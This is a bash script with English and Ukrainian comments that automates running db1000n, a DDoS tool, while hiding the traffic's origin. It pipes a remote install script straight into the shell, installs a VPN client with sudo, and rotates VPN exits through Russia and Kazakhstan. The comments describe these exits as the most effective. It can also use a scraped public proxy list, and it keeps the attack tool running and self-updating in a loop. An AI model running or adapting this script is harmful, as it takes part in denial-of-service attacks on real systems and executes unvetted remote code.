#!/bin/bash

#script requires installed and configured hotspotshield VPN client
#для роботи скрипту необхідний встановленний та налаштований hotspotshield VPN

#script for automatic download newest version of db1000n and running it only if hotspotshield is active
#you can choose whatever server to connect to. to change server change RU to another country from country list availibaly by commend hotspotshield locations
#скрипт для автоматичного встановлення останньої версії db1000n та запуску тільки якщо hotspotshield під'єднаний до сервера.список локацій доступний по команді hotspotshield locations
#сервер можете вибрати будь-який,але найефективніше працювати з Росії та Казахстану. 
#location=(RU BY AZ GE MD AM BG HR FR IL IN IT KG KZ RO ES SE SK CH TR)
location=(RU KZ)

#продолжительность работы скрипта до переподключения VPN сервера
#the duration of the script until the VPN server is reconnected
runtime="10 minute"

#to get info that you are still connected to VPN server leave the line below without changes. else change to false
#щоб отримувати інформацію про стан з'єднання з VPN, залиште значення нижче без змін.щоб вимкнути вивід про стан підключення, змініть значення на false
connected=true #true are false 

#timing between checks if still connected to VPN server.put number in seconds
#як часто перевіряти з'єднання з VPN сервером.час в секундах
timing=10s

#if you want to use Hotspotshield VPN leave the line unchanged. for using proxy change value to true
#якщо хочете використовувати Hotspotshield VPN, залиште значення без змін. для використання proxy змініть на true
use_proxy=false


#checking for installation
EXE=db1000n

if [ -e "$EXE" ]
then
	tput setaf 3; echo "Application already downloaded";tput setaf 6
else
	until [ -f db1000n ]
	do
		tput setaf 6; source <(curl https://raw.githubusercontent.com/Arriven/db1000n/main/install.sh); rm db1000n_*
	done
fi

if (! command -v hotspotshield &> /dev/null) && [[ "$use_proxy" != "true" ]]
then
	URL="https://repo.hotspotshield.com/deb/rel/all/pool/main/h/hotspotshield/hotspotshield_1.0.7_amd64.deb"
	WORKDIR=$(mktemp -d)
	trap "rm -r ${WORKDIR}" EXIT
	(cd "$WORKDIR" && curl -v -L "$URL" > hotspotshield.deb && sudo apt install -yq ./hotspotshield.deb) || exit 1
	tput setaf 3; echo "$(date +%T) start hotspotshield server, please login";hotspotshield start
fi
	

#running main script
function connect {
if $use_proxy
then
	./db1000n -enable-self-update -self-update-check-frequency=1h -restart-on-update=false \
        	 --proxy '{{ join (split (get_url "https://raw.githubusercontent.com/porthole-ascend-cinnamon/proxy_scraper/main/proxies.txt") "\n") "," }}'&
else
        ./db1000n -enable-self-update -self-update-check-frequency=1h -restart-on-update=false&
fi

}
if pgrep "$EXE" > /dev/null
   then
	pgrep -f "$EXE" | xargs kill 
fi
if hotspotshield status  | grep -q 'connected'
	then 
	tput setaf 3; echo "$(date +%T) disconnecting from hotspotshield server on start"; hotspotshield disconnect; sleep 5s;tput setaf 6
fi

trap "pgrep -f '$EXE' | xargs kill > /dev/null" EXIT
while true
do
	if ! $use_proxy 
	then
      		endtime=$(date -ud "$runtime" +%s)
		while [[ $(date -u +%s) -le $endtime ]]
		do
			if hotspotshield status | grep -q 'disconnected'
			then
          			if pgrep "$EXE" > /dev/null
            			then
              				tput setaf 3; echo "disconnected from hotspotshield server"; echo "killing db1000n to restart connection to hotspotshield"; tput setaf 6
              				pgrep -f "$EXE" | xargs kill -9; sleep 2s;  \
            			fi
              		die1=$((RANDOM % ${#location[*]}))
              		tput setaf 3; echo "$(date +%T) changing VPN location every ${runtime}s"
              		tput setaf 3; echo "$(date +%T) connecting VPN location: ${location[$die1]}"; hotspotshield connect ${location[$die1]}; sleep 5s
              		echo "starting new instance $EXE"; tput setaf 6
              		connect
        else
          if $connected
          then
            if pgrep "$EXE" > /dev/null
            then
              tput setaf 2;echo "$(date +%T) hotspotshield still active and $EXE running";tput setaf 6; sleep  $timing
            else
              connect
            fi
          else
            sleep $timing
          fi
			  fi
		  done
		  tput setaf 3; echo "$(date +%T) disconnecting from hotspotshield server loop"; tput setaf 6;hotspotshield disconnect
		else
			if $connected
			then
				if pgrep "$EXE" > /dev/null
				then
					tput setaf 2;echo "$(date +%T) using proxy and $EXE running";tput setaf 6; sleep  $timing
				else
					connect
				fi
			else
				sleep $timing
			fi
		fi
done
